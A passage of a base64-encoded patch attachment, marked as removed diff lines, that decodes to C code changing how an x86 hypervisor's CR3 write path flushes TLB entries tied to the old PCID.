-aXRlIGJlbG93IG5lZWRzIHRvIGZsdXNoIHRoaXMgdmVyeQorICAgICAqIFBD
-SUQsIGV2ZW4gd2hlbiBhIGZ1bGwgZmx1c2ggd2FzIHBlcmZvcm1lZCBhYm92
-ZSwgYXMgd2UgYXJlIGN1cnJlbnRseQorICAgICAqIGFjY3VtdWxhdGluZyBU
-TEIgZW50cmllcyBhZ2FpbiBmcm9tIHRoZSBvbGQgYWRkcmVzcyBzcGFjZS4K
-KyAgICAgKiBOQjogQ2xlYXJpbmcgdGhlIGJpdCB3aGVuIHdlIGRvbid0IHVz
-ZSBQQ0lEIGlzIGJlbmlnbiAoYXMgaXQgaXMgY2xlYXIKKyAgICAgKiBhbHJl
-YWR5IGluIHRoYXQgY2FzZSksIGJ1dCBhbGxvd3MgdGhlIGlmKCkgdG8gYmUg
-bW9yZSBzaW1wbGUuCisgICAgICovCisgICAgb2xkX3BjaWQgPSBjcjNfcGNp
-ZChyZWFkX2NyMygpKTsKKyAgICBpZiAoIG9sZF9wY2lkID09IGNyM19wY2lk
-KGNyMykgKQorICAgICAgICBjcjMgJj0gflg4Nl9DUjNfTk9GTFVTSDsKKwog
-ICAgIHdyaXRlX2NyMyhjcjMpOwogCiAgICAgaWYgKCBvbGRfY3I0ICE9IGNy
-NCApCiAgICAgICAgIHdyaXRlX2NyNChjcjQpOwotICAgIGVsc2UgaWYgKCBv
-bGRfcGNpZCAhPSBjcjNfcGNpZChjcjMpICkKLSAgICAgICAgLyoKLSAgICAg
-ICAgICogTWFrZSBzdXJlIG5vIFRMQiBlbnRyaWVzIHJlbGF0ZWQgdG8gdGhl
-IG9sZCBQQ0lEIGNyZWF0ZWQgYmV0d2VlbgotICAgICAgICAgKiBmbHVzaGlu
-ZyB0aGUgVExCIGFuZCB3cml0aW5nIHRoZSBuZXcgJWNyMyB2YWx1ZSByZW1h
-aW4gaW4gdGhlIFRMQi4KLSAgICAgICAgICovCisKKyAgICAvKgorICAgICAq
-IE1ha2Ugc3VyZSBubyBUTEIgZW50cmllcyByZWxhdGVkIHRvIHRoZSBvbGQg
-UENJRCBjcmVhdGVkIGJldHdlZW4KKyAgICAgKiBmbHVzaGluZyB0aGUgVExC
-IGFuZCB3cml0aW5nIHRoZSBuZXcgJWNyMyB2YWx1ZSByZW1haW4gaW4gdGhl
-IFRMQi4KKyAgICAgKgorICAgICAqIFRoZSB3cml0ZSB0byBDUjQganVzdCBh
-Ym92ZSBoYXMgcGVyZm9ybWVkIGEgd2lkZXIgZmx1c2ggaW4gY2VydGFpbgor
-ICAgICAqIGNhc2VzLCB3aGljaCB0aGVyZWZvcmUgZ2V0IGV4Y2x1ZGVkIGhl
-cmUuIFNpbmNlIHRoYXQgd3JpdGUgaXMKKyAgICAgKiBjb25kaXRpb25hbCwg
-bm90ZSBpbiBwYXJ0aWN1bGFyIHRoYXQgaXQgd29uJ3QgYmUgc2tpcHBlZCBp
-ZiBQQ0lERQorICAgICAqIHRyYW5zaXRpb25zIGZyb20gMSB0byAwLiBUaGlz
-IGlzIGJlY2F1c2UgdGhlIENSNCB3cml0ZSBmdXJ0aGVyIHVwIHdpbGwKKyAg
-ICAgKiBoYXZlIGJlZW4gc2tpcHBlZCBpbiB0aGlzIGNhc2UsIGFzIFBDSURF
-IGFuZCBQR0Ugd29uJ3QgYm90aCBiZSBzZXQgYXQKKyAgICAgKiB0aGUgc2Ft
-ZSB0aW1lLgorICAgICAqCisgICAgICogTm90ZSBhbHNvIHRoYXQgUEdFIGlz
-IGFsd2F5cyBjbGVhciBpbiBvbGRfY3I0LgorICAgICAqLworICAgIGlmICgg
-b2xkX3BjaWQgIT0gY3IzX3BjaWQoY3IzKSAmJgorICAgICAgICAgIShjcjQg
-JiBYODZfQ1I0X1BHRSkgJiYKKyAgICAgICAgIChvbGRfY3I0ICYgWDg2X0NS
-NF9QQ0lERSkgPD0gKGNyNCAmIFg4Nl9DUjRfUENJREUpICkKICAgICAgICAg
-aW52cGNpZF9mbHVzaF9zaW5nbGVfY29udGV4dChvbGRfcGNpZCk7CiAKICAg
-ICBwb3N0X2ZsdXNoKHQpOwo=
-
---=separator--
